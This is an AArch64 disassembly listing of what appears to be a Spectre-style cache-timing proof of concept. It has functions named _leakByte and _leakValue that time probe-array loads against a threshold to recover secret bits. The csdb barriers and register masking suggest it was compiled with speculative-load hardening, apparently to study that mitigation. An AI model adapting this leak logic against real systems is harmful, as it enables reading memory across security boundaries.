00000001000038f8	cmp	w21, #0x0
00000001000038fc	b.ge	0x100003894
0000000100003900	csel	x16, x16, xzr, lt
0000000100003904	adrp	x11, 5 ; 0x100008000
0000000100003908	ldr	x8, [x11, #0x50]
000000010000390c	and	x8, x8, x16
0000000100003910	dmb	sy
0000000100003914	isb
0000000100003918	ldr	x9, [x28, #0x80]
000000010000391c	and	x9, x9, x16
0000000100003920	dmb	sy
0000000100003924	isb
0000000100003928	csdb
000000010000392c	ldr	x10, [x8]
0000000100003930	dmb	sy
0000000100003934	isb
0000000100003938	ldr	x8, [x28, #0x80]
000000010000393c	and	x8, x8, x16
0000000100003940	dmb	sy
0000000100003944	isb
0000000100003948	csdb
000000010000394c	sub	x10, x8, x9
0000000100003950	cmp	x10, #0x78
0000000100003954	ccmp	x8, x9, #0x4, lo
0000000100003958	ldr	w8, [x22]
000000010000395c	and	w8, w8, w16
0000000100003960	csdb
0000000100003964	cinc	w8, w8, ne
0000000100003968	str	w8, [x22]
000000010000396c	ldr	x8, [x11, #0x50]
0000000100003970	and	x8, x8, x16
0000000100003974	csdb
0000000100003978	add	x8, x8, #0x200
000000010000397c	dmb	sy
0000000100003980	isb
0000000100003984	ldr	x9, [x28, #0x80]
0000000100003988	and	x9, x9, x16
000000010000398c	dmb	sy
0000000100003990	isb
0000000100003994	ldr	x10, [x8]
0000000100003998	dmb	sy
000000010000399c	isb
00000001000039a0	ldr	x8, [x28, #0x80]
00000001000039a4	and	x8, x8, x16
00000001000039a8	dmb	sy
00000001000039ac	isb
00000001000039b0	csdb
00000001000039b4	sub	x10, x8, x9
00000001000039b8	cmp	x10, #0x78
00000001000039bc	ccmp	x8, x9, #0x4, lo
00000001000039c0	ldr	w8, [x22, #0x4]
00000001000039c4	and	w8, w8, w16
00000001000039c8	csdb
00000001000039cc	cinc	w8, w8, ne
00000001000039d0	str	w8, [x22, #0x4]
00000001000039d4	ldr	x8, [x11, #0x50]
00000001000039d8	and	x8, x8, x16
00000001000039dc	csdb
00000001000039e0	add	x8, x8, #0x400
00000001000039e4	dmb	sy
00000001000039e8	isb
00000001000039ec	ldr	x9, [x28, #0x80]
00000001000039f0	and	x9, x9, x16
00000001000039f4	dmb	sy
00000001000039f8	isb
00000001000039fc	ldr	x10, [x8]
0000000100003a00	dmb	sy
0000000100003a04	isb
0000000100003a08	ldr	x8, [x28, #0x80]
0000000100003a0c	and	x8, x8, x16
0000000100003a10	dmb	sy
0000000100003a14	isb
0000000100003a18	csdb
0000000100003a1c	sub	x10, x8, x9
0000000100003a20	cmp	x10, #0x78
0000000100003a24	ccmp	x8, x9, #0x4, lo
0000000100003a28	ldr	w8, [x22, #0x8]
0000000100003a2c	and	w8, w8, w16
0000000100003a30	csdb
0000000100003a34	cinc	w8, w8, ne
0000000100003a38	str	w8, [x22, #0x8]
0000000100003a3c	ldr	x8, [x11, #0x50]
0000000100003a40	and	x8, x8, x16
0000000100003a44	csdb
0000000100003a48	add	x8, x8, #0x600
0000000100003a4c	dmb	sy
0000000100003a50	isb
0000000100003a54	ldr	x9, [x28, #0x80]
0000000100003a58	and	x9, x9, x16
0000000100003a5c	dmb	sy
0000000100003a60	isb
0000000100003a64	ldr	x10, [x8]
0000000100003a68	dmb	sy
0000000100003a6c	isb
0000000100003a70	ldr	x8, [x28, #0x80]
0000000100003a74	and	x8, x8, x16
0000000100003a78	dmb	sy
0000000100003a7c	isb
0000000100003a80	csdb
0000000100003a84	sub	x10, x8, x9
0000000100003a88	cmp	x10, #0x78
0000000100003a8c	ccmp	x8, x9, #0x4, lo
0000000100003a90	ldr	w8, [x22, #0xc]
0000000100003a94	and	w8, w8, w16
0000000100003a98	csdb
0000000100003a9c	cinc	w8, w8, ne
0000000100003aa0	str	w8, [x22, #0xc]
0000000100003aa4	ldr	w8, [sp, #0xc]
0000000100003aa8	and	w8, w8, w16
0000000100003aac	csdb
0000000100003ab0	add	w8, w8, #0x1
0000000100003ab4	cmp	w8, #0x4
0000000100003ab8	b.ne	0x1000037e0
0000000100003abc	csel	x16, x16, xzr, eq
0000000100003ac0	adr	x8, #0x45b4
0000000100003ac4	nop
0000000100003ac8	ldp	w9, w10, [x8]
0000000100003acc	and	w9, w9, w16
0000000100003ad0	and	w10, w10, w16
0000000100003ad4	csdb
0000000100003ad8	cmp	w9, #0x0
0000000100003adc	cset	w11, gt
0000000100003ae0	bic	w9, w9, w9, asr #31
0000000100003ae4	mov	w12, #0x2
0000000100003ae8	cmp	w10, w9
0000000100003aec	csel	w11, w12, w11, gt
0000000100003af0	csel	w9, w10, w9, gt
0000000100003af4	ldr	w8, [x8, #0x8]
0000000100003af8	and	w8, w8, w16
0000000100003afc	mov	w10, #0x3
0000000100003b00	csdb
0000000100003b04	cmp	w8, w9
0000000100003b08	csel	w0, w10, w11, gt
0000000100003b0c	ldp	x29, x30, [sp, #0x60]
0000000100003b10	and	x29, x29, x16
0000000100003b14	and	x30, x30, x16
0000000100003b18	ldp	x20, x19, [sp, #0x50]
0000000100003b1c	and	x20, x20, x16
0000000100003b20	and	x19, x19, x16
0000000100003b24	ldp	x22, x21, [sp, #0x40]
0000000100003b28	and	x22, x22, x16
0000000100003b2c	and	x21, x21, x16
0000000100003b30	ldp	x24, x23, [sp, #0x30]
0000000100003b34	and	x24, x24, x16
0000000100003b38	and	x23, x23, x16
0000000100003b3c	ldp	x26, x25, [sp, #0x20]
0000000100003b40	and	x26, x26, x16
0000000100003b44	and	x25, x25, x16
0000000100003b48	ldp	x28, x27, [sp, #0x10]
0000000100003b4c	and	x28, x28, x16
0000000100003b50	and	x27, x27, x16
0000000100003b54	add	sp, sp, #0x70
0000000100003b58	mov	x0, sp
0000000100003b5c	and	x0, x0, x16
0000000100003b60	mov	sp, x0
0000000100003b64	csdb
0000000100003b68	ret
_leakByte:
0000000100003b6c	cmp	sp, #0x0
0000000100003b70	csetm	x16, ne
0000000100003b74	stp	x22, x21, [sp, #-0x30]!
0000000100003b78	stp	x20, x19, [sp, #0x10]
0000000100003b7c	stp	x29, x30, [sp, #0x20]
0000000100003b80	add	x29, sp, #0x20
0000000100003b84	mov	x19, x0
0000000100003b88	lsl	x20, x0, #2
0000000100003b8c	mov	w0, #0x3
0000000100003b90	bfi	x0, x19, #2, #62
0000000100003b94	mov	x1, sp
0000000100003b98	and	x1, x1, x16
0000000100003b9c	mov	sp, x1
0000000100003ba0	bl	_leakValue
0000000100003ba4	cmp	sp, #0x0
0000000100003ba8	csetm	x16, ne
0000000100003bac	mov	x21, x0
0000000100003bb0	mov	w0, #0x2
0000000100003bb4	bfi	x0, x19, #2, #62
0000000100003bb8	mov	x1, sp
0000000100003bbc	and	x1, x1, x16
0000000100003bc0	mov	sp, x1
0000000100003bc4	bl	_leakValue
0000000100003bc8	cmp	sp, #0x0
0000000100003bcc	csetm	x16, ne
0000000100003bd0	mov	x22, x0
0000000100003bd4	mov	w0, #0x1
0000000100003bd8	bfi	x0, x19, #2, #62
0000000100003bdc	mov	x1, sp
0000000100003be0	and	x1, x1, x16
0000000100003be4	mov	sp, x1
0000000100003be8	bl	_leakValue
0000000100003bec	cmp	sp, #0x0
0000000100003bf0	csetm	x16, ne
0000000100003bf4	mov	x19, x0
0000000100003bf8	mov	x0, x20
0000000100003bfc	mov	x1, sp
0000000100003c00	and	x1, x1, x16
0000000100003c04	mov	sp, x1
0000000100003c08	bl	_leakValue
0000000100003c0c	cmp	sp, #0x0
0000000100003c10	csetm	x16, ne
0000000100003c14	lsl	w8, w21, #4
0000000100003c18	orr	w8, w8, w22, lsl #2
0000000100003c1c	orr	w8, w8, w19
0000000100003c20	orr	w0, w0, w8, lsl #2
0000000100003c24	ldp	x29, x30, [sp, #0x20]
0000000100003c28	and	x29, x29, x16
0000000100003c2c	and	x30, x30, x16
0000000100003c30	ldp	x20, x19, [sp, #0x10]
0000000100003c34	and	x20, x20, x16
0000000100003c38	and	x19, x19, x16
0000000100003c3c	ldp	x22, x21, [sp], #0x30
0000000100003c40	and	xzr, xzr, x16
0000000100003c44	and	x22, x22, x16
0000000100003c48	and	x21, x21, x16
0000000100003c4c	csdb
0000000100003c50	mov	x0, sp
0000000100003c54	and	x0, x0, x16
0000000100003c58	mov	sp, x0
0000000100003c5c	ret
